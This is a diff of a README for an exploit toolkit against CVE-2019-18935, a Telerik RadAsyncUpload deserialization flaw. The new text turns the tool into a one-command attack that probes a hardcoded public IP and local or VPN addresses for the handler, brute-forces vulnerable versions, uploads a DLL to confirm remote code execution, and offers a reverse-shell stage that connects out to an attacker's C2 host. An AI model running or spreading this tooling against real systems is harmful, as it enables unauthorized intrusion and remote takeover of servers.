@@ -8,26 +8,39 @@ Everything is wired into a single script, `run.sh`, plus prebuilt payloads in
 `payloads/` (x86 + amd64, committed so no compiler is needed on the Mac).
 
 ```bash
-git clone <this-repo> && cd <this-repo>
+git clone https://github.com/raiyanlabs/cve && cd cve
 chmod +x run.sh
 
-# handler check + version discovery + sleep-payload RCE verification:
-TARGET_URL="http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau" ./run.sh all
+# ONE COMMAND — finds the target, finds the version, proves RCE:
+./run.sh
 ```
 
-Stages: `./run.sh check | versions | exploit | shell | all`
+That's it. `./run.sh` auto-discovers everything and prints a big
+**`SUCCESS — CVE-2019-18935 CONFIRMED (RCE)`** banner the moment the
+sleep-payload deserialization makes the target pause ~10s.
 
-| Stage      | Does                                                              |
-|------------|-------------------------------------------------------------------|
-| `check`    | Confirms the `RadAsyncUpload` handler is registered               |
-| `versions` | Discovers the vulnerable Telerik version (RAU_crypto probes)      |
-| `exploit`  | Uploads `sleep` DLL + triggers deserialization (~10 s = RCE)      |
-| `shell`    | Uploads `revshell` DLL + triggers (start your C2 listener first)  |
-| `all`      | = `exploit`                                                       |
+How it self-configures:
 
-Env vars: `TARGET_URL` (required), `PAGE_URL`, `FOLDER` (default `C:\Windows\Temp`),
-`ARCH` (`x86`/`amd64`/`both`), `VERSION` (pin, skip discovery), `REV_HOST`/`REV_PORT`
-(reverse-shell C2), `PYTHON`.
+1. **DISCOVER** — builds a candidate list (a pinned URL, the known target
+   `125.18.164.11:82`, plus local/VPN interface IPs on common web ports) and
+   probes each for the `RadAsyncUpload` handler until one answers.
+2. **VERSIONS** — brute-forces the known-vulnerable Telerik versions (newest
+   first) with the read-only `RAU_crypto` upload until one is accepted.
+3. **EXPLOIT** — uploads the `sleep` mixed-mode DLL, triggers deserialization,
+   and times the response. **≥8s → SUCCESS banner.**
+
+Optional one-liner variants:
+
+```bash
+./run.sh http://125.18.164.11:82          # pin the target, skip discovery
+./run.sh check                            # just confirm the handler
+./run.sh versions                         # handler + version discovery
+./run.sh shell                            # ...then fire the reverse shell
+REV_HOST=<c2-ip> REV_PORT=4444 ./run.sh shell
+```
+
+If it doesn't confirm, it tells you exactly what to try next (other
+architecture `ARCH=amd64`/`x86`, or another `VERSION=`).
 
 A GitHub Actions job (`.github/workflows/build-dlls.yml`) rebuilds and re-commits
 the payloads on any change to the C sources, using MSVC on a Windows runner.
